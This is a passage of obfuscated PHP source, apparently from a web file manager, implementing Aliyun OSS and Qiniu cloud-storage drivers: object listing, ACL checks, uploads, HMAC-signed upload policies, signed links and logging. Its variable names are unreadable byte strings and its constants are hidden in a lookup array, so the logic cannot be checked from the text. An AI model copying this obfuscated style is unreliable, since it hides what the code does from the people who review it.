$Ï¬¯÷ÆÕ[8], $Ï¬¯÷ÆÕ[1636] => $Û®Ç‚Ÿº, $Ï¬¯÷ÆÕ[1637] => $Ìı÷å¤í, $Ï¬¯÷ÆÕ[1638] => $”…±Üè©); try { $¶×íÀæ› = $this->client->listObjects($this->bucket, $¥€‡úÇÊ); } catch (OSS\Core\OssException $üàî×¹÷) { $this->writeLog(__FUNCTION__ . $Ï¬¯÷ÆÕ[214] . $üàî×¹÷->getMessage()); break; } $”…±Üè© = $¶×íÀæ›->getNextMarker(); $éİÛƒí = $¶×íÀæ›->getObjectList(); $Øş¨ÙÉü = $¶×íÀæ›->getPrefixList(); if ($Ë¬İõ) { if (count($éİÛƒí) > 1 || count($éİÛƒí) == 1 && $éİÛƒí[0]->getKey() != $Û®Ç‚Ÿº) { $Ş‡ÌÎê¸ += count($éİÛƒí) - 1; } if (!empty($Øş¨ÙÉü)) { $Ú½¡¿éĞ += count($Øş¨ÙÉü); } if ($”…±Üè© === $Ï¬¯÷ÆÕ[12]) { break; } continue; } if ($ôÓÜÑ°é) { if (!empty($éİÛƒí)) { if (count($éİÛƒí) > 1 || $éİÛƒí[0]->getKey() != $Û®Ç‚Ÿº) { return !0; } } } else { if (!empty($Øş¨ÙÉü)) { return !0; } } if ($”…±Üè© === $Ï¬¯÷ÆÕ[12]) { break; } } if ($Ë¬İõ) { return array($Ï¬¯÷ÆÕ[241] => $Ş‡ÌÎê¸, $Ï¬¯÷ÆÕ[242] => $Ú½¡¿éĞ); } return !1; } public function listAll($ÇÅì”Ã”) { $ö±øœâö =& $_SERVER[Ï×Œõ”û]; $³¨ê¬¿É = $this->fileList($ÇÅì”Ã”, $ö±øœâö[12], !0); $Ä± ì‚ï = array_to_keyvalue($³¨ê¬¿É[$ö±øœâö[86]], $ö±øœâö[32]); foreach ($³¨ê¬¿É[$ö±øœâö[85]] as $ Ûå‹¦) { if (is_string($ Ûå‹¦)) { $Ä± ì‚ï[$ Ûå‹¦] = array($ö±øœâö[79] => 0); } } return $this->listAllFiles($ÇÅì”Ã”, $Ä± ì‚ï); } public function canRead($Íê¼‘) { $óÃı˜Æñ =& $_SERVER[Ï×Œõ”û]; $¡¼ù¢“ = $this->pathAcl($Íê¼‘); return $¡¼ù¢“ == $óÃı˜Æñ[1645] || $¡¼ù¢“ == $óÃı˜Æñ[647] ? !0 : !1; } public function canWrite($é¥æ¶‡è) { $òæØØ˜ = $this->pathAcl($é¥æ¶‡è); return $òæØØ˜ == $_SERVER[Ï×Œõ”û][647] ? !0 : !1; } public function pathAcl($£À½È¦) { $±„‚ÌÁğ =& $_SERVER[Ï×Œõ”û]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¬®ßÂÛˆ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($£À½È¦)); } catch (OSS\Core\OssException $Œ«ÍªÒø) { $this->writeLog(__FUNCTION__ . $±„‚ÌÁğ[214] . $Œ«ÍªÒø->getMessage()); return !1; } $é½¨ò¬Ü = $¬®ßÂÛˆ == $±„‚ÌÁğ[37] ? $this->bucketAcl : $¬®ßÂÛˆ; if ($é½¨ò¬Ü == $±„‚ÌÁğ[1646]) { return $±„‚ÌÁğ[1645]; } if ($é½¨ò¬Ü == $±„‚ÌÁğ[1647]) { return $±„‚ÌÁğ[647]; } return $é½¨ò¬Ü; } private function chmodPath($ğÒ±İû“, $¬·—âÖâ = '') { $³ì„ŞÊÛ =& $_SERVER[Ï×Œõ”û]; $¡†…ğ‚õ = empty($¬·—âÖâ) ? $³ì„ŞÊÛ[1647] : $¬·—âÖâ; $‘İ²‹øµ = array($³ì„ŞÊÛ[37], $³ì„ŞÊÛ[231], $³ì„ŞÊÛ[1646], $³ì„ŞÊÛ[1647]); if (!in_array($¡†…ğ‚õ, $‘İ²‹øµ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ğÒ±İû“), $¡†…ğ‚õ); } catch (OSS\Core\OssException $Ìœ²¨ÍÂ) { $this->writeLog(__FUNCTION__ . $³ì„ŞÊÛ[214] . $Ìœ²¨ÍÂ->getMessage()); return !1; } return !0; } public function getContent($„Šù÷) { return $this->fileSubstr($„Šù÷, -1); } public function setContent($ÜïÄì”Å, $ú…­¸² = '') { $ù £õìš =& $_SERVER[Ï×Œõ”û]; try { $Ö‹–ñÂ  = $this->trafficLimit($ù £õìš[1648]); $àı›‡“í = $this->client->putObject($this->bucket, $this->pathEncode($ÜïÄì”Å), $ú…­¸², $Ö‹–ñÂ ); } catch (OSS\Core\OssException $¹æÁ³— ) { $this->writeLog(__FUNCTION__ . $ù £õìš[214] . $¹æÁ³— ->getMessage()); return !1; } $îŞ«Ÿ§ = array($ù £õìš[1642] => trim($àı›‡“í[$ù £õìš[1639]], $ù £õìš[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÜïÄì”Å))); $this->updateObjMeta($ÜïÄì”Å, $îŞ«Ÿ§); return isset($àı›‡“í[$ù £õìš[1649]][$ù £õìš[296]]) ? !0 : !1; } private function updateObjMeta($Ë¸òîÏÜ, $Å”¡Œ®ş) { $Ë¸òîÏÜ = $this->pathEncode($Ë¸òîÏÜ); try { $•ˆ³‰ûŒ = array(OSS\OssClient::OSS_HEADERS => $Å”¡Œ®ş); $this->client->copyObject($this->bucket, $Ë¸òîÏÜ, $this->bucket, $Ë¸òîÏÜ, $•ˆ³‰ûŒ); } catch (OSS\Core\OssException $‚‡Éğß) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][214] . $‚‡Éğß->getMessage()); return !1; } return !0; } public function upload($—Ô¢“Æı, $ÇÀ¦¶ôÆ, $º²Ê·š = false, $ÆÕ¯÷§½ = REPEAT_REPLACE) { $×‹˜ËÉ =& $_SERVER[Ï×Œõ”û]; if (!$ÇÀ¦¶ôÆ || !@file_exists($ÇÀ¦¶ôÆ)) { return !1; } $ıëââÕ¦ = trim($—Ô¢“Æı, $×‹˜ËÉ[8]); $¹£û•­Š = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($×‹˜ËÉ[1642] => @md5_file($ÇÀ¦¶ôÆ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($—Ô¢“Æı))); $¹£û•­Š = $this->trafficLimit($×‹˜ËÉ[1648], $¹£û•­Š); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ıëââÕ¦), $ÇÀ¦¶ôÆ, $¹£û•­Š); } catch (OSS\Core\OssException $›Ÿ€âšš) { $this->writeLog(__FUNCTION__ . $×‹˜ËÉ[214] . $›Ÿ€âšš->getMessage()); return !1; } return $this->getPathOuter($—Ô¢“Æı); } public function getHost() { $˜¢Š¿ê— =& $_SERVER[Ï×Œõ”û]; $×äÎ«¼ä = explode($˜¢Š¿ê—[210], parent::getHost()); return $×äÎ«¼ä[0] . $˜¢Š¿ê—[210] . $this->bucket . $˜¢Š¿ê—[10] . $×äÎ«¼ä[1]; } public function uploadFormData($‡™Õ‰àÎ, $†±“Õ®æ = 3600) { $ÊàÍ­–ª =& $_SERVER[Ï×Œõ”û]; if (!($Â¢şé´å = $this->getHost())) { return !1; } $¸ú³Èß = $†±“Õ®æ; $ªÕÌÍœ = date($ÊàÍ­–ª[1650], time() + $¸ú³Èß); $ØËı¦™˜ = new DateTime($ªÕÌÍœ); $ ‡ÂØ = $ØËı¦™˜->format(DateTime::ISO8601); $İÅ¿‚ß = strpos($ ‡ÂØ, $ÊàÍ­–ª[373]); $ ‡ÂØ = substr($ ‡ÂØ, 0, $İÅ¿‚ß) . $ÊàÍ­–ª[1651]; $Ê‡¾ÚŠØ = 1048576000 * 5; $ƒíò–ÏÕ = $this->pathFather($‡™Õ‰àÎ); $üäñŞ·ˆ = array($ÊàÍ­–ª[264] => $ ‡ÂØ, $ÊàÍ­–ª[267] => array(array($ÊàÍ­–ª[1652], 0, $Ê‡¾ÚŠØ), array($ÊàÍ­–ª[269], $ÊàÍ­–ª[270], $ƒíò–ÏÕ))); $Ç¯Ğ¤äÎ = base64_encode(json_encode($üäñŞ·ˆ)); $£Ëä§¹Ş = base64_encode(hash_hmac($ÊàÍ­–ª[1478], $Ç¯Ğ¤äÎ, $this->secret, !0)); $ùºòË‹ = array($ÊàÍ­–ª[1653] => $this->accessKey, $ÊàÍ­–ª[279] => $Ç¯Ğ¤äÎ, $ÊàÍ­–ª[272] => $ÊàÍ­–ª[263], $ÊàÍ­–ª[1654] => $£Ëä§¹Ş, $ÊàÍ­–ª[208] => $Â¢şé´å); $ùºòË‹ = $this->trafficLimit($ÊàÍ­–ª[1648], $ùºòË‹, !0); return $ùºòË‹; } public function uploadMultiData($²·°µÊ, $²àç…ó« = 3600) { $Õµ›µ­è =& $_SERVER[Ï×Œõ”û]; if (!($È¡ú¬©¿ = $this->getHost())) { return !1; } $ÆéÖø°ø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($²·°µÊ)); return array($Õµ›µ­è[283] => $ÆéÖø°ø, $Õµ›µ­è[208] => $È¡ú¬©¿ . $Õµ›µ­è[8] . $this->pathEncode($²·°µÊ), $Õµ›µ­è[284] => gmdate($Õµ›µ­è[1655]), $Õµ›µ­è[95] => $²·°µÊ); } public function uploadMultiAuth($¬ç¸ÔØ, $ü½şÊÑ‘ = array()) { if (isset($ü½şÊÑ‘[$_SERVER[Ï×Œõ”û][285]])) { return $this->uploadPartAuth($¬ç¸ÔØ, $ü½şÊÑ‘); } return $this->uploadListAuth($¬ç¸ÔØ, $ü½şÊÑ‘); } private function uploadPartAuth($Æ´Û¸›Æ, $Â•²ş“ = array()) { $ˆû˜Îƒü =& $_SERVER[Ï×Œõ”û]; $ÃèÏºğ = $Â•²ş“[$ˆû˜Îƒü[95]]; $Æš×ÌÊ = $this->_getUploadAuth($ÃèÏºğ, $Â•²ş“); $í²ğ³ = array($ˆû˜Îƒü[288] => $Æš×ÌÊ[$ˆû˜Îƒü[288]], $ˆû˜Îƒü[284] => $Æš×ÌÊ[$ˆû˜Îƒü[284]]); if (isset($Æš×ÌÊ[$ˆû˜Îƒü[1656]])) { $í²ğ³[$ˆû˜Îƒü[1656]] = $Æš×ÌÊ[$ˆû˜Îƒü[1656]]; } return $í²ğ³; } private function uploadListAuth($“õĞù…’, $Ê½€Ù¯ = array()) { $ñ¸’¬üØ =& $_SERVER[Ï×Œõ”û]; $ùÉû…ßÂ = $Ê½€Ù¯[$ñ¸’¬üØ[95]]; $é±Í³ğ = $Ê½€Ù¯[$ñ¸’¬üØ[283]]; $½‹ƒ„Ë— = $this->client->listParts($this->bucket, $this->pathEncode($ùÉû…ßÂ), $é±Í³ğ); $ğ½èİ«— = $½‹ƒ„Ë—->getListPart(); $ºÎşÊËÜ = array(); foreach ($ğ½èİ«— as $ªë±ˆ˜µ) { $ºÎşÊËÜ[] = array($ñ¸’¬üØ[299] => $ªë±ˆ˜µ->getPartNumber(), $ñ¸’¬üØ[300] => trim($ªë±ˆ˜µ->getETag(), $ñ¸’¬üØ[119])); } if (!$ºÎşÊËÜ) { return !1; } $Ş–ñÒ = $this->_getUploadAuth($ùÉû…ßÂ, $Ê½€Ù¯); return array($ñ¸’¬üØ[288] => $Ş–ñÒ[$ñ¸’¬üØ[288]], $ñ¸’¬üØ[284] => $Ş–ñÒ[$ñ¸’¬üØ[284]], $ñ¸’¬üØ[291] => $ºÎşÊËÜ); } private function _getUploadAuth($´ñÃäïÊ, $Â‰¶âÅ¬) { $ €ªÈ˜ =& $_SERVER[Ï×Œõ”û]; $Å¢ØØŞÌ = gmdate($ €ªÈ˜[1655]); $‘½œµÇ = isset($Â‰¶âÅ¬[$ €ªÈ˜[285]]) ? $ €ªÈ˜[255] : $ €ªÈ˜[290]; $èÄáãëÂ = array_intersect_key($Â‰¶âÅ¬, array_flip(array($ €ªÈ˜[285], $ €ªÈ˜[283]))); ksort($èÄáãëÂ); $ßí²ÍÏ† = $èÄáãëÂ ? $ €ªÈ˜[76] . http_build_query($èÄáãëÂ, null, $ €ªÈ˜[286], PHP_QUERY_RFC3986) : $ €ªÈ˜[12]; $Î¦ƒ¿Œ… = array($‘½œµÇ, $ €ªÈ˜[12], $ €ªÈ˜[121], $Å¢ØØŞÌ, "\x78\x2d\x6f\x73\x73\55\x64\x61\164\x65\72{$Å¢ØØŞÌ}", $ €ªÈ˜[8] . $this->bucket . $ €ªÈ˜[8] . $´ñÃäïÊ . $ßí²ÍÏ†); if (isset($Â‰¶âÅ¬[$ €ªÈ˜[285]])) { $äûœ¶¿´ = $this->trafficLimit($ €ªÈ˜[1648], array(), !0); if ($äûœ¶¿´) { $´ñÃäïÊ = $ €ªÈ˜[1656]; array_splice($Î¦ƒ¿Œ…, 5, 0, $´ñÃäïÊ . $ €ªÈ˜[4] . $äûœ¶¿´[$´ñÃäïÊ]); } } $ÙÜûª”ˆ = implode($ €ªÈ˜[287], $Î¦ƒ¿Œ…); $ÅŒ…£éÖ = base64_encode(hash_hmac($ €ªÈ˜[1478], $ÙÜûª”ˆ, $this->secret, !0)); $ÖàŠ¶š« = $ €ªÈ˜[1625] . $this->accessKey . $ €ªÈ˜[4] . $ÅŒ…£éÖ; $¹¬Áô¡ô = array($ €ªÈ˜[288] => $ÖàŠ¶š«, $ €ªÈ˜[284] => $Å¢ØØŞÌ); if (!empty($äûœ¶¿´)) { $¹¬Áô¡ô = array_merge($¹¬Áô¡ô, $äûœ¶¿´); } return $¹¬Áô¡ô; } public function download($¡­ŠÉü, $Ù§ú´²°) { $à÷à’Æ• =& $_SERVER[Ï×Œõ”û]; if ($this->isFolder($¡­ŠÉü)) { return !1; } try { $¿¶¡—í‚ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ù§ú´²°); $¿¶¡—í‚ = $this->trafficLimit($à÷à’Æ•[110], $¿¶¡—í‚); $this->client->getObject($this->bucket, $this->pathEncode($¡­ŠÉü), $¿¶¡—í‚); } catch (OSS\Core\OssException $ûîìÂŒ») { $this->writeLog(__FUNCTION__ . $à÷à’Æ•[214] . $ûîìÂŒ»->getMessage()); return !1; } return $Ù§ú´²°; } public function fileSubstr($ğ•È½‡•, $µ— Ê‡ = 0, $öì¬„™è = false) { if ($µ— Ê‡ === -1) { $ğ×Úœ×¼ = array(); } else { if ($öì¬„™è === !1) { $‰„ˆ·Œ = $this->size($ğ•È½‡•); } else { $‰„ˆ·Œ = $µ— Ê‡ + $öì¬„™è - 1; } $ğ×Úœ×¼ = array(OSS\OssClient::OSS_RANGE => "{$µ— Ê‡}\x2d{$‰„ˆ·Œ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ğ•È½‡•), $ğ×Úœ×¼); } catch (OSS\Core\OssException $¶ç¶å¤™) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][214] . $¶ç¶å¤™->getMessage()); think_exception($¶ç¶å¤™->getMessage()); return !1; } } private function trafficLimit($»„¶£Çî, $’û˜Íˆ± = array(), $ÑÆÊå¹è = false) { $Éà§¯¨ =& $_SERVER[Ï×Œõ”û]; if ($»„¶£Çî == $Éà§¯¨[1648] && $this->isUploadServer() || $»„¶£Çî == $Éà§¯¨[110] && $this->isFileOutServer()) { return $’û˜Íˆ±; } $¨½°¨‹ù = floatval($GLOBALS[$Éà§¯¨[6]][$Éà§¯¨[92]][$Éà§¯¨[108]][$»„¶£Çî]) * 1024 * 1024 * 8; if (!$¨½°¨‹ù) { return $’û˜Íˆ±; } $¨½°¨‹ù = $¨½°¨‹ù < 819200 ? 819200 : ($¨½°¨‹ù > 838860800 ? 838860800 : $¨½°¨‹ù); if ($ÑÆÊå¹è) { $’û˜Íˆ±[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¨½°¨‹ù); } else { if (!isset($’û˜Íˆ±[OSS\OssClient::OSS_HEADERS])) { $’û˜Íˆ±[OSS\OssClient::OSS_HEADERS] = array(); } $’û˜Íˆ±[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¨½°¨‹ù); } return $’û˜Íˆ±; } public function link($©ÈİÜ¤, $ØµÕ’ = array()) { $¥ ¥€´ò =& $_SERVER[Ï×Œõ”û]; if (!$this->exist($©ÈİÜ¤) || $this->isFolder($©ÈİÜ¤)) { return !1; } try { $ØµÕ’ = $this->trafficLimit($¥ ¥€´ò[110], $ØµÕ’, !0); $µ“€Ğ¡ë = $this->client->signUrl($this->bucket, $this->pathEncode($©ÈİÜ¤), 3600 * 12, $¥ ¥€´ò[1560], $ØµÕ’); return $this->getCdnLink($µ“€Ğ¡ë); } catch (OSS\Core\OssException $­•¢Óğ–) { $this->writeLog(__FUNCTION__ . $¥ ¥€´ò[214] . $­•¢Óğ–->getMessage()); return !1; } } public function fileOut($ùÒ·¢ô¥, $Ş¯‡ÌØ· = false, $¥íóà· = false, $Ëš¸İµ¡ = '') { $öâí¥™ =& $_SERVER[Ï×Œõ”û]; if ($this->isFileOutServer()) { return $this->fileOutServer($ùÒ·¢ô¥, $Ş¯‡ÌØ·, $¥íóà·, $Ëš¸İµ¡); } if (!$¥íóà·) { $¥íóà· = $this->pathThis($ùÒ·¢ô¥); } $¥íóà· = rawurlencode($¥íóà·); $èà Ã­Î = get_file_mime(get_path_ext($¥íóà·)); if ($èà Ã­Î == $öâí¥™[250]) { return parent::fileOut($ùÒ·¢ô¥, $Ş¯‡ÌØ·, $¥íóà·, $Ëš¸İµ¡); } $Ş¯‡ÌØ· = $Ş¯‡ÌØ· ? $öâí¥™[1657] : $öâí¥™[1658]; $õ¥ïŒÂ‚ = array(OSS\OssClient::OSS_SUB_RESOURCE => $öâí¥™[1659] . rawurlencode("{$Ş¯‡ÌØ·}\x3b\x66\151\154\145\x6e\x61\155\x65\x3d{$¥íóà·}")); $–ùÕÚ­Ê = $this->link($ùÒ·¢ô¥, $õ¥ïŒÂ‚); $this->fileOutLink($–ùÕÚ­Ê); } public function fileOutServer($òãŸÍ—À, $ÇİÔµ¡ = false, $Ğ¿×ê’¹ = false, $ôÉã¯Úí = '') { parent::fileOut($òãŸÍ—À, $ÇİÔµ¡, $Ğ¿×ê’¹, $ôÉã¯Úí); } public function fileOutImage($¬à£¯ê¾, $›ÎÑ«ïè = 250) { if ($this->size($¬à£¯ê¾) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¬à£¯ê¾, $›ÎÑ«ïè); } $¯Ş¢Ş–• = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ï×Œõ”û][1622] . $›ÎÑ«ïè); $Î€Ùˆ¯° = $this->link($¬à£¯ê¾, $¯Ş¢Ş–•); $this->fileOutLink($Î€Ùˆ¯°); } public function fileOutImageServer($œ„”ïÁ›, $µ›É±†í = 250) { parent::fileOutImage($œ„”ïÁ›, $µ›É±†í); } public function fileOutLink($íœ¶úÛ) { $Ä»‡‚öº =& $_SERVER[Ï×Œõ”û]; if (!$this->isCdnHost() && substr($íœ¶úÛ, 0, 7) == $Ä»‡‚öº[218]) { $íœ¶úÛ = $Ä»‡‚öº[219] . substr($íœ¶úÛ, 7); } header($Ä»‡‚öº[174] . $íœ¶úÛ); die; } public function hashMd5($Ç´²„Ô«, $ïœ ÷¡ = '') { $°ñÄˆÁŸ =& $_SERVER[Ï×Œõ”û]; $ÒæÛ–Äå = $this->_objectMeta($Ç´²„Ô«); if (!$ÒæÛ–Äå) { return $°ñÄˆÁŸ[12]; } if (!isset($ÒæÛ–Äå[$°ñÄˆÁŸ[1642]]) && !empty($ïœ ÷¡)) { $‡ù÷‡¾ = $this->updateObjMeta($Ç´²„Ô«, array($°ñÄˆÁŸ[1642] => $ïœ ÷¡)); $ÒæÛ–Äå[$°ñÄˆÁŸ[1642]] = $‡ù÷‡¾ ? $ïœ ÷¡ : $°ñÄˆÁŸ[12]; } return isset($ÒæÛ–Äå[$°ñÄˆÁŸ[1642]]) ? strtolower($ÒæÛ–Äå[$°ñÄˆÁŸ[1642]]) : $°ñÄˆÁŸ[12]; } public function size($ùé†ªôŒ) { $Ë¯àËü = $this->objectMeta($ùé†ªôŒ); return $Ë¯àËü ? $Ë¯àËü[$_SERVER[Ï×Œõ”û][79]] : 0; } public function info($×Ááèà) { if ($this->isFolder($×Ááèà)) { return $this->folderInfo($×Ááèà); } else { if ($this->isFile($×Ááèà)) { return $this->fileInfo($×Ááèà); } } return !1; } public function exist($ö«âÜœó) { return $this->isFile($ö«âÜœó) || $this->isFolder($ö«âÜœó); } public function isFile($’»ıá½’) { return !$this->isFolder($’»ıá½’) && $this->objectMeta($’»ıá½’); } public function isFolder($›ùÍ°Î¬) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][179], $›ùÍ°Î¬); } protected function objectMeta($‰«¤ê·Ì) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][181], $‰«¤ê·Ì); } protected function _objectMeta($¾Ñ£Í¹æ) { $Ù‘¹¾ô =& $_SERVER[Ï×Œõ”û]; try { $ÜÄ‰¯Ù = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¾Ñ£Í¹æ)); } catch (OSS\Core\OssException $Ì»Äµö») { $this->writeLog(__FUNCTION__ . $Ù‘¹¾ô[214] . $Ì»Äµö»->getMessage()); $ÜÄ‰¯Ù = !1; } if ($ÜÄ‰¯Ù) { $ÜÄ‰¯Ù[$Ù‘¹¾ô[79]] = intval($ÜÄ‰¯Ù[$Ù‘¹¾ô[1640]]); } return $ÜÄ‰¯Ù; } protected function _isFolder($Î¯ªíª„) { $³ŒÇ—ë =& $_SERVER[Ï×Œõ”û]; if ($Î¯ªíª„ == $³ŒÇ—ë[12] || $Î¯ªíª„ == $³ŒÇ—ë[8]) { return !0; } $õ«¸½¢Õ = array($³ŒÇ—ë[1635] => $³ŒÇ—ë[8], $³ŒÇ—ë[1636] => rtrim($Î¯ªíª„, $³ŒÇ—ë[8]) . $³ŒÇ—ë[8], $³ŒÇ—ë[1637] => 1, $³ŒÇ—ë[1638] => $³ŒÇ—ë[12]); $Å´ªŸ©€ = $this->client->listObjects($this->bucket, $õ«¸½¢Õ); if ($Å´ªŸ©€->getObjectList() || $Å´ªŸ©€->getPrefixList()) { return !0; } return !1; } public function writeLog($©óÜæ¹ä = '', $¶¬¶Ğšå = false) { $¥ÏÆˆúŞ =& $_SERVER[Ï×Œõ”û]; $ Ò¨Õ×´ = in_array(ACTION, array($¥ÏÆˆúŞ[212], $¥ÏÆˆúŞ[213])); if (!$ Ò¨Õ×´ && !GLOBAL_DEBUG) { return; } $§À™Í“· = 0; if (stripos($©óÜæ¹ä, $¥ÏÆˆúŞ[1660]) !== !1) { $§À™Í“· = 1; $¿©¬Åå = explode($¥ÏÆˆúŞ[1661], $©óÜæ¹ä); $©óÜæ¹ä = !empty($¿©¬Åå[1]) ? $¿©¬Åå[1] : $©óÜæ¹ä; } else { if (stripos($©óÜæ¹ä, $¥ÏÆˆúŞ[1662])) { $§À™Í“· = 2; $¿©¬Åå = explode($¥ÏÆˆúŞ[1662], $©óÜæ¹ä); $¿©¬Åå = explode($¥ÏÆˆúŞ[4], $¿©¬Åå[0]); $©óÜæ¹ä = !empty($¿©¬Åå[1]) ? $¿©¬Åå[1] : $©óÜæ¹ä; } } if ($ Ò¨Õ×´ && I18n::getType() == $¥ÏÆˆúŞ[1663]) { if ($§À™Í“· == 1) { $©óÜæ¹ä = str_replace($¥ÏÆˆúŞ[1664], $¥ÏÆˆúŞ[1665], $©óÜæ¹ä); } else { if ($§À™Í“· == 2) { $¿©¬Åå = explode($¥ÏÆˆúŞ[214], $¿©¬Åå[0]); $ïĞ†›Ï¤ = isset($¿©¬Åå[1]) ? $¿©¬Åå[1] : $¥ÏÆˆúŞ[12]; $²¸ªòÚï = array($¥ÏÆˆúŞ[1666] => $¥ÏÆˆúŞ[1667], $¥ÏÆˆúŞ[1668] => $¥ÏÆˆúŞ[1669], $¥ÏÆˆúŞ[1670] => $¥ÏÆˆúŞ[1671], $¥ÏÆˆúŞ[1672] => $¥ÏÆˆúŞ[1673], $¥ÏÆˆúŞ[1674] => $¥ÏÆˆúŞ[1675], $¥ÏÆˆúŞ[1676] => $¥ÏÆˆúŞ[1677], $¥ÏÆˆúŞ[1678] => $¥ÏÆˆúŞ[1679], $¥ÏÆˆúŞ[1680] => $¥ÏÆˆúŞ[1681], $¥ÏÆˆúŞ[1682] => $¥ÏÆˆúŞ[1683], $¥ÏÆˆúŞ[1684] => $¥ÏÆˆúŞ[1685]); if (isset($²¸ªòÚï[$ïĞ†›Ï¤])) { $©óÜæ¹ä = $²¸ªòÚï[$ïĞ†›Ï¤]; } } } if (stripos($©óÜæ¹ä, $¥ÏÆˆúŞ[1686])) { $©óÜæ¹ä = $¥ÏÆˆúŞ[1687]; } } if (!trim($©óÜæ¹ä)) { return; } parent::writeLog(trim($©óÜæ¹ä), $¶¬¶Ğšå); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($×¢‹Ï–ä) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ï×Œõ”û][1688]; $this->_init($×¢‹Ï–ä); } public function _init($÷ÔÌ”•³) { $ˆÌÚ¿á =& $_SERVER[Ï×Œõ”û]; $this->config = $÷ÔÌ”•³; foreach ($÷ÔÌ”•³ as $¤éºôÈã => $„Â™äœÁ) { if (isset($this->{$¤éºôÈã})) { $this->{$¤éºôÈã} = $„Â™äœÁ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ˆÌÚ¿á[1689] . LNG($ˆÌÚ¿á[1626])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ğ¾Å—×å, $À¹âóô = '', $ğÖÈ¢è = REPEAT_RENAME) { if ($this->setContent($ğ¾Å—×å, $À¹âóô)) { return $this->getPathOuter($ğ¾Å—×å); } return !1; } public function mkdir($Ş¦ŒñØĞ, $Âôˆæ­¢ = REPEAT_SKIP) { $‘œ¶‰ªú =& $_SERVER[Ï×Œõ”û]; $™™¿½¹² = trim($Ş¦ŒñØĞ, $‘œ¶‰ªú[8]); if ($this->_isFolder($™™¿½¹²)) { return $this->getPathOuter($™™¿½¹²); } $Ş¦ŒñØĞ = $™™¿½¹² . $‘œ¶‰ªú[8]; $•í‘æ®â = get_path_this($™™¿½¹²); $ßè¨‹ÕÆ = $Ş¦ŒñØĞ . $•í‘æ®â; if (!$this->mkfile($ßè¨‹ÕÆ)) { return !1; } if (!$this->moveFile($ßè¨‹ÕÆ, $Ş¦ŒñØĞ)) { $this->delFile($ßè¨‹ÕÆ); return !1; } return $this->getPathOuter($™™¿½¹²); } public function copyFile($øà–°¼¿, $®¶Çù¥Ä) { $òÍšù’ş = $this->bucketManager->copy($this->bucket, $øà–°¼¿, $this->bucket, $®¶Çù¥Ä, !0); return $òÍšù’ş ? !1 : $this->getPathOuter($®¶Çù¥Ä); } public function moveFile($Ô©ĞÒ¢š, $§¸ùìÙ–) { $™¨ƒˆšŠ = $this->bucketManager->move($this->bucket, $Ô©ĞÒ¢š, $this->bucket, $§¸ùìÙ–, !0); return $™¨ƒˆšŠ ? !1 : $this->getPathOuter($§¸ùìÙ–); } public function delFile($†‡Ş£¦) { if (!$this->exist($†‡Ş£¦)) { return !0; } $Â’ò£Æ™ = $this->bucketManager->delete($this->bucket, $†‡Ş£¦); if (!$Â’ò£Æ™) { return !0; } return $Â’ò£Æ™->code() == 612 ? !0 : !1; } public function delFolder($Úšı½ë) { $™ÈæÒ·• =& $_SERVER[Ï×Œõ”û]; if (!$this->exist($Úšı½ë)) { return !0; } $this->listItemCache = !1; $ëÁ¯Õâƒ = $this->fileList($Úšı½ë); $this->listItemCache = !0; $æóÚä® = trim($Úšı½ë, $™ÈæÒ·•[8]) . $™ÈæÒ·•[8]; if (!empty($Úšı½ë) && $Úšı½ë !== $™ÈæÒ·•[230] && !in_array($æóÚä®, $ëÁ¯Õâƒ[$™ÈæÒ·•[85]])) { $ëÁ¯Õâƒ[$™ÈæÒ·•[85]][] = $æóÚä®; } $Ÿ»“‘ø = $this->delByBatch($ëÁ¯Õâƒ[$™ÈæÒ·•[86]]); if (!$Ÿ»“‘ø) { return !1; } $Ÿ»“‘ø = $this->delByBatch($ëÁ¯Õâƒ[$™ÈæÒ·•[85]]); if (!$Ÿ»“‘ø) { return !1; } return $this->delFile($æóÚä®); } private function delByBatch($“Ç¼úØ¤) { foreach (array_chunk($“Ç¼úØ¤, 1000) as $¬°ìÓ†Õ) { $İ‘ÂÈÒ = $this->bucketManager->buildBatchDelete($this->bucket, $¬°ìÓ†Õ); list($¢ï¼æÆ…, $»úÍß°î) = $this->bucketManager->batch($İ‘ÂÈÒ); if ($»úÍß°î) { return !1; } } return !0; } public function rename($áşÍ³»â, $ú •óÈÒ) { return $this->renameObject($áşÍ³»â, $ú •óÈÒ); } public function fileInfo($ïˆ¢Ù³, $ş®ÕÕì¶ = false, $ÔŒ±È¯¿ = array()) { $ëĞÎ§â¦ =& $_SERVER[Ï×Œõ”û]; $’âÙÃîô = array($ëĞÎ§â¦[32] => $this->pathThis($ïˆ¢Ù³), $ëĞÎ§â¦[87] => $this->getPathOuter($ëĞÎ§â¦[8] . $ïˆ¢Ù³), 